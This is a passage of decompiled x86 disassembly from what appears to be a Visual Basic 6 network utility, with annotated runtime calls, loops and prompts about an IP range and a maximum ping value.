007F278A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F278F: add esp, 00000020h
007F2792: push eax
007F2793: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2798: push eax
007F2799: lea eax, var_78
007F279C: push eax
007F279D: call 00410A84h ; Set (object)
007F27A2: push eax
007F27A3: lea eax, var_000000B4
007F27A9: push eax
007F27AA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F27AF: add esp, 00000020h
007F27B2: push var_40
007F27B5: call 0041098Eh ; Len(arg_1)
007F27BA: mov var_000000CC, eax
007F27C0: mov var_000000D4, 00000003h
007F27CA: lea eax, var_000000B4
007F27D0: push eax
007F27D1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F27D6: mov var_000000BC, eax
007F27DC: mov var_000000C4, 00000008h
007F27E6: lea eax, var_000000D4
007F27EC: push eax
007F27ED: push 00000001h
007F27EF: lea eax, var_000000C4
007F27F5: push eax
007F27F6: lea eax, var_000000E4
007F27FC: push eax
007F27FD: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
007F2802: lea eax, var_000000E4
007F2808: push eax
007F2809: lea eax, var_000000F4
007F280F: push eax
007F2810: call 00410856h ; LCase(arg_1)
007F2815: lea eax, var_40
007F2818: mov var_00000190, eax
007F281E: mov var_00000198, 00004008h
007F2828: lea eax, var_00000198
007F282E: push eax
007F282F: lea eax, var_00000104
007F2835: push eax
007F2836: call 00410856h ; LCase(arg_1)
007F283B: lea eax, var_000000F4
007F2841: push eax
007F2842: lea eax, var_00000104
007F2848: push eax
007F2849: call 004108FEh ; msvbvm60.dll.__vbaVarTstEq
007F284E: mov var_000001F0, ax
007F2855: lea eax, var_78
007F2858: push eax
007F2859: lea eax, var_74
007F285C: push eax
007F285D: lea eax, var_70
007F2860: push eax
007F2861: push 00000003h
007F2863: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2868: add esp, 00000010h
007F286B: lea eax, var_00000104
007F2871: push eax
007F2872: lea eax, var_000000F4
007F2878: push eax
007F2879: lea eax, var_000000E4
007F287F: push eax
007F2880: lea eax, var_000000D4
007F2886: push eax
007F2887: lea eax, var_000000C4
007F288D: push eax
007F288E: lea eax, var_000000B4
007F2894: push eax
007F2895: lea eax, var_000000A4
007F289B: push eax
007F289C: lea eax, var_00000094
007F28A2: push eax
007F28A3: push 00000008h
007F28A5: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F28AA: add esp, 00000024h
007F28AD: movsx eax, word ptr var_000001F0
007F28B4: test eax, eax
007F28B6: jz 7F28C4h
007F28B8: mov var_04, 0000005Ch
007F28BF: or word ptr var_38, FFFFh
007F28C4: mov var_04, 0000005Eh
007F28CB: lea eax, var_000002E0
007F28D1: push eax
007F28D2: lea eax, var_000002D0
007F28D8: push eax
007F28D9: lea eax, var_30
007F28DC: push eax
007F28DD: call 00410A36h ; Next
007F28E2: mov var_000003D0, eax
007F28E8: cmp var_000003D0, 00000000h
007F28EF: jnz 007F26A5h
007F28F5: mov var_04, 0000005Fh
007F28FC: mov edx, var_40
007F28FF: mov ecx, 008F2494h
007F2904: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F2909: mov var_04, 00000060h
007F2910: cmp word ptr var_38, FFFFh
007F2915: jnz 007F307Bh
007F291B: mov var_04, 00000061h
007F2922: mov var_00000150, 00000001h
007F292C: mov var_00000158, 00000002h
007F2936: cmp [008F2010h], 00000000h
007F293D: jnz 7F295Ah
007F293F: push 008F2010h
007F2944: push 00433984h
007F2949: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F294E: mov var_000004C8, 008F2010h
007F2958: jmp 7F2964h
007F295A: mov var_000004C8, 008F2010h
007F2964: push 00000000h
007F2966: push 00000001h
007F2968: push 00440E48h
007F296D: push 00000000h
007F296F: push 00000018h
007F2971: mov eax, var_000004C8
007F2977: mov eax, [eax]
007F2979: mov ecx, var_000004C8
007F297F: mov ecx, [ecx]
007F2981: mov ecx, [ecx]
007F2983: push eax
007F2984: call [ecx+00000550h]
007F298A: push eax
007F298B: lea eax, var_70
007F298E: push eax
007F298F: call 00410A84h ; Set (object)
007F2994: push eax
007F2995: lea eax, var_00000094
007F299B: push eax
007F299C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F29A1: add esp, 00000010h
007F29A4: push eax
007F29A5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F29AA: push eax
007F29AB: lea eax, var_74
007F29AE: push eax
007F29AF: call 00410A84h ; Set (object)
007F29B4: push eax
007F29B5: lea eax, var_000000A4
007F29BB: push eax
007F29BC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F29C1: add esp, 00000010h
007F29C4: push eax
007F29C5: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F29CA: mov var_00000160, eax
007F29D0: mov var_00000168, 00000003h
007F29DA: mov var_00000170, 00000001h
007F29E4: mov var_00000178, 00000002h
007F29EE: lea eax, var_00000158
007F29F4: push eax
007F29F5: lea eax, var_00000168
007F29FB: push eax
007F29FC: lea eax, var_00000178
007F2A02: push eax
007F2A03: lea eax, var_00000300
007F2A09: push eax
007F2A0A: lea eax, var_000002F0
007F2A10: push eax
007F2A11: lea eax, var_30
007F2A14: push eax
007F2A15: call 00410A3Ch ; For
007F2A1A: mov var_000003D4, eax
007F2A20: lea eax, var_74
007F2A23: push eax
007F2A24: lea eax, var_70
007F2A27: push eax
007F2A28: push 00000002h
007F2A2A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2A2F: add esp, 0000000Ch
007F2A32: lea eax, var_000000A4
007F2A38: push eax
007F2A39: lea eax, var_00000094
007F2A3F: push eax
007F2A40: push 00000002h
007F2A42: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F2A47: add esp, 0000000Ch
007F2A4A: jmp 007F3069h
007F2A4F: mov var_04, 00000062h
007F2A56: mov var_00000160, 00000001h
007F2A60: mov var_00000168, 00000003h
007F2A6A: lea eax, var_30
007F2A6D: mov var_00000150, eax
007F2A73: mov var_00000158, 0000400Ch
007F2A7D: cmp [008F2010h], 00000000h
007F2A84: jnz 7F2AA1h
007F2A86: push 008F2010h
007F2A8B: push 00433984h
007F2A90: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2A95: mov var_000004CC, 008F2010h
007F2A9F: jmp 7F2AABh
007F2AA1: mov var_000004CC, 008F2010h
007F2AAB: push 00000010h
007F2AAD: pop eax
007F2AAE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2AB3: lea esi, var_00000168
007F2AB9: mov edi, esp
007F2ABB: movsd 
007F2ABC: movsd 
007F2ABD: movsd 
007F2ABE: movsd 
007F2ABF: push 00000001h
007F2AC1: push 00000010h
007F2AC3: push 00440E58h
007F2AC8: push 00000010h
007F2ACA: pop eax
007F2ACB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2AD0: lea esi, var_00000158
007F2AD6: mov edi, esp
007F2AD8: movsd 
007F2AD9: movsd 
007F2ADA: movsd 
007F2ADB: movsd 
007F2ADC: push 00000001h
007F2ADE: push 00000000h
007F2AE0: push 00440E48h
007F2AE5: push 00000000h
007F2AE7: push 00000018h
007F2AE9: mov eax, var_000004CC
007F2AEF: mov eax, [eax]
007F2AF1: mov ecx, var_000004CC
007F2AF7: mov ecx, [ecx]
007F2AF9: mov ecx, [ecx]
007F2AFB: push eax
007F2AFC: call [ecx+00000550h]
007F2B02: push eax
007F2B03: lea eax, var_70
007F2B06: push eax
007F2B07: call 00410A84h ; Set (object)
007F2B0C: push eax
007F2B0D: lea eax, var_00000094
007F2B13: push eax
007F2B14: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2B19: add esp, 00000010h
007F2B1C: push eax
007F2B1D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2B22: push eax
007F2B23: lea eax, var_74
007F2B26: push eax
007F2B27: call 00410A84h ; Set (object)
007F2B2C: push eax
007F2B2D: lea eax, var_000000A4
007F2B33: push eax
007F2B34: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2B39: add esp, 00000020h
007F2B3C: push eax
007F2B3D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2B42: push eax
007F2B43: lea eax, var_78
007F2B46: push eax
007F2B47: call 00410A84h ; Set (object)
007F2B4C: push eax
007F2B4D: lea eax, var_000000B4
007F2B53: push eax
007F2B54: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2B59: add esp, 00000020h
007F2B5C: push var_40
007F2B5F: call 0041098Eh ; Len(arg_1)
007F2B64: mov var_000000CC, eax
007F2B6A: mov var_000000D4, 00000003h
007F2B74: lea eax, var_000000B4
007F2B7A: push eax
007F2B7B: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F2B80: mov var_000000BC, eax
007F2B86: mov var_000000C4, 00000008h
007F2B90: lea eax, var_000000D4
007F2B96: push eax
007F2B97: push 00000001h
007F2B99: lea eax, var_000000C4
007F2B9F: push eax
007F2BA0: lea eax, var_000000E4
007F2BA6: push eax
007F2BA7: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
007F2BAC: lea eax, var_000000E4
007F2BB2: push eax
007F2BB3: lea eax, var_000000F4
007F2BB9: push eax
007F2BBA: call 00410856h ; LCase(arg_1)
007F2BBF: lea eax, var_40
007F2BC2: mov var_00000190, eax
007F2BC8: mov var_00000198, 00004008h
007F2BD2: lea eax, var_00000198
007F2BD8: push eax
007F2BD9: lea eax, var_00000104
007F2BDF: push eax
007F2BE0: call 00410856h ; LCase(arg_1)
007F2BE5: lea eax, var_000000F4
007F2BEB: push eax
007F2BEC: lea eax, var_00000104
007F2BF2: push eax
007F2BF3: call 004108FEh ; msvbvm60.dll.__vbaVarTstEq
007F2BF8: mov var_000001F0, ax
007F2BFF: lea eax, var_78
007F2C02: push eax
007F2C03: lea eax, var_74
007F2C06: push eax
007F2C07: lea eax, var_70
007F2C0A: push eax
007F2C0B: push 00000003h
007F2C0D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2C12: add esp, 00000010h
007F2C15: lea eax, var_00000104
007F2C1B: push eax
007F2C1C: lea eax, var_000000F4
007F2C22: push eax
007F2C23: lea eax, var_000000E4
007F2C29: push eax
007F2C2A: lea eax, var_000000D4
007F2C30: push eax
007F2C31: lea eax, var_000000C4
007F2C37: push eax
007F2C38: lea eax, var_000000B4
007F2C3E: push eax
007F2C3F: lea eax, var_000000A4
007F2C45: push eax
007F2C46: lea eax, var_00000094
007F2C4C: push eax
007F2C4D: push 00000008h
007F2C4F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F2C54: add esp, 00000024h
007F2C57: movsx eax, word ptr var_000001F0
007F2C5E: test eax, eax
007F2C60: jz 007F2FA2h
007F2C66: mov var_04, 00000063h
007F2C6D: lea eax, var_30
007F2C70: mov var_00000150, eax
007F2C76: mov var_00000158, 0000400Ch
007F2C80: cmp [008F2010h], 00000000h
007F2C87: jnz 7F2CA4h
007F2C89: push 008F2010h
007F2C8E: push 00433984h
007F2C93: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2C98: mov var_000004D0, 008F2010h
007F2CA2: jmp 7F2CAEh
007F2CA4: mov var_000004D0, 008F2010h
007F2CAE: push 00000000h
007F2CB0: push 00000014h
007F2CB2: push 00440E58h
007F2CB7: push 00000010h
007F2CB9: pop eax
007F2CBA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2CBF: lea esi, var_00000158
007F2CC5: mov edi, esp
007F2CC7: movsd 
007F2CC8: movsd 
007F2CC9: movsd 
007F2CCA: movsd 
007F2CCB: push 00000001h
007F2CCD: push 00000000h
007F2CCF: push 00440E48h
007F2CD4: push 00000000h
007F2CD6: push 00000018h
007F2CD8: mov eax, var_000004D0
007F2CDE: mov eax, [eax]
007F2CE0: mov ecx, var_000004D0
007F2CE6: mov ecx, [ecx]
007F2CE8: mov ecx, [ecx]
007F2CEA: push eax
007F2CEB: call [ecx+00000550h]
007F2CF1: push eax
007F2CF2: lea eax, var_70
007F2CF5: push eax
007F2CF6: call 00410A84h ; Set (object)
007F2CFB: push eax
007F2CFC: lea eax, var_00000094
007F2D02: push eax
007F2D03: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2D08: add esp, 00000010h
007F2D0B: push eax
007F2D0C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2D11: push eax
007F2D12: lea eax, var_74
007F2D15: push eax
007F2D16: call 00410A84h ; Set (object)
007F2D1B: push eax
007F2D1C: lea eax, var_000000A4
007F2D22: push eax
007F2D23: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2D28: add esp, 00000020h
007F2D2B: push eax
007F2D2C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2D31: push eax
007F2D32: lea eax, var_78
007F2D35: push eax
007F2D36: call 00410A84h ; Set (object)
007F2D3B: push eax
007F2D3C: lea eax, var_000000B4
007F2D42: push eax
007F2D43: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2D48: add esp, 00000010h
007F2D4B: lea eax, var_30
007F2D4E: mov var_00000160, eax
007F2D54: mov var_00000168, 0000400Ch
007F2D5E: cmp [008F2010h], 00000000h
007F2D65: jnz 7F2D82h
007F2D67: push 008F2010h
007F2D6C: push 00433984h
007F2D71: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2D76: mov var_000004D4, 008F2010h
007F2D80: jmp 7F2D8Ch
007F2D82: mov var_000004D4, 008F2010h
007F2D8C: push 00000000h
007F2D8E: push 00000014h
007F2D90: push 00440E58h
007F2D95: push 00000010h
007F2D97: pop eax
007F2D98: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2D9D: lea esi, var_00000168
007F2DA3: mov edi, esp
007F2DA5: movsd 
007F2DA6: movsd 
007F2DA7: movsd 
007F2DA8: movsd 
007F2DA9: push 00000001h
007F2DAB: push 00000000h
007F2DAD: push 00440E48h
007F2DB2: push 00000000h
007F2DB4: push 00000018h
007F2DB6: mov eax, var_000004D4
007F2DBC: mov eax, [eax]
007F2DBE: mov ecx, var_000004D4
007F2DC4: mov ecx, [ecx]
007F2DC6: mov ecx, [ecx]
007F2DC8: push eax
007F2DC9: call [ecx+00000550h]
007F2DCF: push eax
007F2DD0: lea eax, var_7C
007F2DD3: push eax
007F2DD4: call 00410A84h ; Set (object)
007F2DD9: push eax
007F2DDA: lea eax, var_000000C4
007F2DE0: push eax
007F2DE1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2DE6: add esp, 00000010h
007F2DE9: push eax
007F2DEA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2DEF: push eax
007F2DF0: lea eax, var_80
007F2DF3: push eax
007F2DF4: call 00410A84h ; Set (object)
007F2DF9: push eax
007F2DFA: lea eax, var_000000D4
007F2E00: push eax
007F2E01: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2E06: add esp, 00000020h
007F2E09: push eax
007F2E0A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2E0F: push eax
007F2E10: lea eax, var_00000084
007F2E16: push eax
007F2E17: call 00410A84h ; Set (object)
007F2E1C: push eax
007F2E1D: lea eax, var_000000E4
007F2E23: push eax
007F2E24: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2E29: add esp, 00000010h
007F2E2C: cmp [008F2410h], 00000000h
007F2E33: jnz 7F2E50h
007F2E35: push 008F2410h
007F2E3A: push 00440E38h
007F2E3F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2E44: mov var_000004D8, 008F2410h
007F2E4E: jmp 7F2E5Ah
007F2E50: mov var_000004D8, 008F2410h
007F2E5A: mov eax, var_000004D8
007F2E60: mov eax, [eax]
007F2E62: mov var_000001F0, eax
007F2E68: mov var_0000011C, 80020004h
007F2E72: mov var_00000124, 0000000Ah
007F2E7C: mov var_0000010C, 80020004h
007F2E86: mov var_00000114, 0000000Ah
007F2E90: lea eax, var_000000E4
007F2E96: push eax
007F2E97: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F2E9C: mov var_000000FC, eax
007F2EA2: mov var_00000104, 00000008h
007F2EAC: lea eax, var_000000B4
007F2EB2: push eax
007F2EB3: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F2EB8: mov var_000000EC, eax
007F2EBE: mov var_000000F4, 00000008h
007F2EC8: lea eax, var_00000124
007F2ECE: push eax
007F2ECF: lea eax, var_00000114
007F2ED5: push eax
007F2ED6: lea eax, var_00000104
007F2EDC: push eax
007F2EDD: lea eax, var_000000F4
007F2EE3: push eax
007F2EE4: mov eax, var_000001F0
007F2EEA: mov eax, [eax]
007F2EEC: push var_000001F0
007F2EF2: call [eax+20h]
007F2EF5: fclex 
007F2EF7: mov var_000001F4, eax
007F2EFD: cmp var_000001F4, 00000000h
007F2F04: jnl 7F2F26h
007F2F06: push 00000020h
007F2F08: push 00440E28h
007F2F0D: push var_000001F0
007F2F13: push var_000001F4
007F2F19: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F2F1E: mov var_000004DC, eax
007F2F24: jmp 7F2F2Dh
007F2F26: and var_000004DC, 00000000h
007F2F2D: lea eax, var_00000084
007F2F33: push eax
007F2F34: lea eax, var_80
007F2F37: push eax
007F2F38: lea eax, var_7C
007F2F3B: push eax
007F2F3C: lea eax, var_78
007F2F3F: push eax
007F2F40: lea eax, var_74
007F2F43: push eax
007F2F44: lea eax, var_70
007F2F47: push eax
007F2F48: push 00000006h
007F2F4A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2F4F: add esp, 0000001Ch
007F2F52: lea eax, var_00000124
007F2F58: push eax
007F2F59: lea eax, var_00000114
007F2F5F: push eax
007F2F60: lea eax, var_00000104
007F2F66: push eax
007F2F67: lea eax, var_000000F4
007F2F6D: push eax
007F2F6E: lea eax, var_000000E4
007F2F74: push eax
007F2F75: lea eax, var_000000D4
007F2F7B: push eax
007F2F7C: lea eax, var_000000C4
007F2F82: push eax
007F2F83: lea eax, var_000000B4
007F2F89: push eax
007F2F8A: lea eax, var_000000A4
007F2F90: push eax
007F2F91: lea eax, var_00000094
007F2F97: push eax
007F2F98: push 0000000Ah
007F2F9A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F2F9F: add esp, 0000002Ch
007F2FA2: mov var_04, 00000065h
007F2FA9: cmp [008F2410h], 00000000h
007F2FB0: jnz 7F2FCDh
007F2FB2: push 008F2410h
007F2FB7: push 00440E38h
007F2FBC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2FC1: mov var_000004E0, 008F2410h
007F2FCB: jmp 7F2FD7h
007F2FCD: mov var_000004E0, 008F2410h
007F2FD7: mov eax, var_000004E0
007F2FDD: mov eax, [eax]
007F2FDF: mov var_000001F0, eax
007F2FE5: lea eax, var_000001DC
007F2FEB: push eax
007F2FEC: mov eax, var_000001F0
007F2FF2: mov eax, [eax]
007F2FF4: push var_000001F0
007F2FFA: call [eax+24h]
007F2FFD: fclex 
007F2FFF: mov var_000001F4, eax
007F3005: cmp var_000001F4, 00000000h
007F300C: jnl 7F302Eh
007F300E: push 00000024h
007F3010: push 00440E28h
007F3015: push var_000001F0
007F301B: push var_000001F4
007F3021: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F3026: mov var_000004E4, eax
007F302C: jmp 7F3035h
007F302E: and var_000004E4, 00000000h
007F3035: mov eax, var_000001DC
007F303B: cmp eax, [008F2480h]
007F3041: jle 7F3045h
007F3043: jmp 7F3076h
007F3045: mov var_04, 00000068h
007F304C: lea eax, var_00000300
007F3052: push eax
007F3053: lea eax, var_000002F0
007F3059: push eax
007F305A: lea eax, var_30
007F305D: push eax
007F305E: call 00410A36h ; Next
007F3063: mov var_000003D4, eax
007F3069: cmp var_000003D4, 00000000h
007F3070: jnz 007F2A4Fh
007F3076: jmp 007F3131h
007F307B: mov var_04, 0000006Ah
007F3082: mov var_000000BC, 80020004h
007F308C: mov var_000000C4, 0000000Ah
007F3096: mov var_000000AC, 80020004h
007F30A0: mov var_000000B4, 0000000Ah
007F30AA: mov var_0000009C, 80020004h
007F30B4: mov var_000000A4, 0000000Ah
007F30BE: mov var_00000150, 004509F0h ; The specified IP range is not available at the moment
007F30C8: mov var_00000158, 00000008h
007F30D2: lea edx, var_00000158
007F30D8: lea ecx, var_00000094
007F30DE: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F30E3: lea eax, var_000000C4
007F30E9: push eax
007F30EA: lea eax, var_000000B4
007F30F0: push eax
007F30F1: lea eax, var_000000A4
007F30F7: push eax
007F30F8: push 00000010h
007F30FA: lea eax, var_00000094
007F3100: push eax
007F3101: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F3106: lea eax, var_000000C4
007F310C: push eax
007F310D: lea eax, var_000000B4
007F3113: push eax
007F3114: lea eax, var_000000A4
007F311A: push eax
007F311B: lea eax, var_00000094
007F3121: push eax
007F3122: push 00000004h
007F3124: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3129: add esp, 00000014h
007F312C: jmp 007F712Eh
007F3131: jmp 007F3E47h
007F3136: mov var_04, 0000006Dh
007F313D: mov eax, [ebp+08h]
007F3140: mov eax, [eax]
007F3142: push [ebp+08h]
007F3145: call [eax+00000364h]
007F314B: push eax
007F314C: lea eax, var_70
007F314F: push eax
007F3150: call 00410A84h ; Set (object)
007F3155: mov var_000001F0, eax
007F315B: lea eax, var_74
007F315E: push eax
007F315F: push 00000003h
007F3161: mov eax, var_000001F0
007F3167: mov eax, [eax]
007F3169: push var_000001F0
007F316F: call [eax+40h]
007F3172: fclex 
007F3174: mov var_000001F4, eax
007F317A: cmp var_000001F4, 00000000h
007F3181: jnl 7F31A3h
007F3183: push 00000040h
007F3185: push 00440DE8h
007F318A: push var_000001F0
007F3190: push var_000001F4
007F3196: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F319B: mov var_000004E8, eax
007F31A1: jmp 7F31AAh
007F31A3: and var_000004E8, 00000000h
007F31AA: push 00000000h
007F31AC: push 00000000h
007F31AE: push var_74
007F31B1: lea eax, var_00000094
007F31B7: push eax
007F31B8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F31BD: add esp, 00000010h
007F31C0: push eax
007F31C1: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F31C6: sub ax, FFFFh
007F31CA: neg ax
007F31CD: sbb eax, eax
007F31CF: inc eax
007F31D0: neg eax
007F31D2: mov var_000001F8, ax
007F31D9: lea eax, var_74
007F31DC: push eax
007F31DD: lea eax, var_70
007F31E0: push eax
007F31E1: push 00000002h
007F31E3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F31E8: add esp, 0000000Ch
007F31EB: lea ecx, var_00000094
007F31F1: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F31F6: movsx eax, word ptr var_000001F8
007F31FD: test eax, eax
007F31FF: jz 007F3E47h
007F3205: mov var_04, 0000006Eh
007F320C: mov [008F2484h], 00000003h
007F3216: mov var_04, 0000006Fh
007F321D: mov var_000000EC, 80020004h
007F3227: mov var_000000F4, 0000000Ah
007F3231: mov var_000000DC, 80020004h
007F323B: mov var_000000E4, 0000000Ah
007F3245: mov var_000000CC, 80020004h
007F324F: mov var_000000D4, 0000000Ah
007F3259: mov var_000000BC, 80020004h
007F3263: mov var_000000C4, 0000000Ah
007F326D: mov var_000000AC, 80020004h
007F3277: mov var_000000B4, 0000000Ah
007F3281: mov var_0000009C, 80020004h
007F328B: mov var_000000A4, 0000000Ah
007F3295: mov var_00000150, 00450A60h ; Maximum ping value
007F329F: mov var_00000158, 00000008h
007F32A9: lea edx, var_00000158
007F32AF: lea ecx, var_00000094
007F32B5: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F32BA: lea eax, var_000000F4
007F32C0: push eax
007F32C1: lea eax, var_000000E4
007F32C7: push eax
007F32C8: lea eax, var_000000D4
007F32CE: push eax
007F32CF: lea eax, var_000000C4
007F32D5: push eax
007F32D6: lea eax, var_000000B4
007F32DC: push eax
007F32DD: lea eax, var_000000A4
007F32E3: push eax
007F32E4: lea eax, var_00000094
007F32EA: push eax
007F32EB: call 00410994h ; InputBox
007F32F0: mov edx, eax
007F32F2: lea ecx, var_3C
007F32F5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F32FA: lea eax, var_000000F4
007F3300: push eax
007F3301: lea eax, var_000000E4
007F3307: push eax
007F3308: lea eax, var_000000D4
007F330E: push eax
007F330F: lea eax, var_000000C4
007F3315: push eax
007F3316: lea eax, var_000000B4
007F331C: push eax
007F331D: lea eax, var_000000A4
007F3323: push eax
007F3324: lea eax, var_00000094
007F332A: push eax
007F332B: push 00000007h
007F332D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3332: add esp, 00000020h
007F3335: mov var_04, 00000070h
007F333C: mov var_00000150, 00000001h
007F3346: mov var_00000158, 00000002h
007F3350: cmp [008F2010h], 00000000h
007F3357: jnz 7F3374h
007F3359: push 008F2010h
007F335E: push 00433984h
007F3363: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3368: mov var_000004EC, 008F2010h
007F3372: jmp 7F337Eh
007F3374: mov var_000004EC, 008F2010h
007F337E: push 00000000h
007F3380: push 00000001h
007F3382: push 00440E48h
007F3387: push 00000000h
007F3389: push 00000018h
007F338B: mov eax, var_000004EC
007F3391: mov eax, [eax]
007F3393: mov ecx, var_000004EC
007F3399: mov ecx, [ecx]
007F339B: mov ecx, [ecx]
007F339D: push eax
007F339E: call [ecx+00000550h]
007F33A4: push eax
007F33A5: lea eax, var_70
007F33A8: push eax
007F33A9: call 00410A84h ; Set (object)
007F33AE: push eax
007F33AF: lea eax, var_00000094
007F33B5: push eax
007F33B6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F33BB: add esp, 00000010h
007F33BE: push eax
007F33BF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F33C4: push eax
007F33C5: lea eax, var_74
007F33C8: push eax
007F33C9: call 00410A84h ; Set (object)
007F33CE: push eax
007F33CF: lea eax, var_000000A4
007F33D5: push eax
007F33D6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F33DB: add esp, 00000010h
007F33DE: push eax
007F33DF: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F33E4: mov var_00000160, eax
007F33EA: mov var_00000168, 00000003h
007F33F4: mov var_00000170, 00000001h
007F33FE: mov var_00000178, 00000002h
007F3408: lea eax, var_00000158
007F340E: push eax
007F340F: lea eax, var_00000168
007F3415: push eax
007F3416: lea eax, var_00000178
007F341C: push eax
007F341D: lea eax, var_00000320
007F3423: push eax
007F3424: lea eax, var_00000310
007F342A: push eax
007F342B: lea eax, var_30
007F342E: push eax
007F342F: call 00410A3Ch ; For
007F3434: mov var_000003D8, eax
007F343A: lea eax, var_74
007F343D: push eax
007F343E: lea eax, var_70
007F3441: push eax
007F3442: push 00000002h
007F3444: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F3449: add esp, 0000000Ch
007F344C: lea eax, var_000000A4
007F3452: push eax
007F3453: lea eax, var_00000094
007F3459: push eax
007F345A: push 00000002h
007F345C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3461: add esp, 0000000Ch
007F3464: jmp 007F3655h
007F3469: mov var_04, 00000071h
007F3470: push var_3C
007F3473: call 004109DCh ; Val(arg_1)
007F3478: fstp real8 ptr var_000001E4
007F347E: mov var_00000160, 0000000Ch
007F3488: mov var_00000168, 00000003h
007F3492: lea eax, var_30
007F3495: mov var_00000150, eax
007F349B: mov var_00000158, 0000400Ch
007F34A5: cmp [008F2010h], 00000000h
007F34AC: jnz 7F34C9h
007F34AE: push 008F2010h
007F34B3: push 00433984h
007F34B8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F34BD: mov var_000004F0, 008F2010h
007F34C7: jmp 7F34D3h
007F34C9: mov var_000004F0, 008F2010h
007F34D3: push 00000010h
007F34D5: pop eax
007F34D6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F34DB: lea esi, var_00000168
007F34E1: mov edi, esp
007F34E3: movsd 
007F34E4: movsd 
007F34E5: movsd 
007F34E6: movsd 
007F34E7: push 00000001h
007F34E9: push 00000010h
007F34EB: push 00440E58h
007F34F0: push 00000010h
007F34F2: pop eax
007F34F3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F34F8: lea esi, var_00000158
007F34FE: mov edi, esp
007F3500: movsd 
007F3501: movsd 
007F3502: movsd 
007F3503: movsd 
007F3504: push 00000001h
007F3506: push 00000000h
007F3508: push 00440E48h
007F350D: push 00000000h
007F350F: push 00000018h
007F3511: mov eax, var_000004F0
007F3517: mov eax, [eax]
007F3519: mov ecx, var_000004F0
007F351F: mov ecx, [ecx]
007F3521: mov ecx, [ecx]
007F3523: push eax
007F3524: call [ecx+00000550h]
007F352A: push eax
007F352B: lea eax, var_70
007F352E: push eax
007F352F: call 00410A84h ; Set (object)
007F3534: push eax
007F3535: lea eax, var_00000094
007F353B: push eax
007F353C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3541: add esp, 00000010h
007F3544: push eax
007F3545: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F354A: push eax
007F354B: lea eax, var_74
007F354E: push eax
007F354F: call 00410A84h ; Set (object)
007F3554: push eax
007F3555: lea eax, var_000000A4
007F355B: push eax
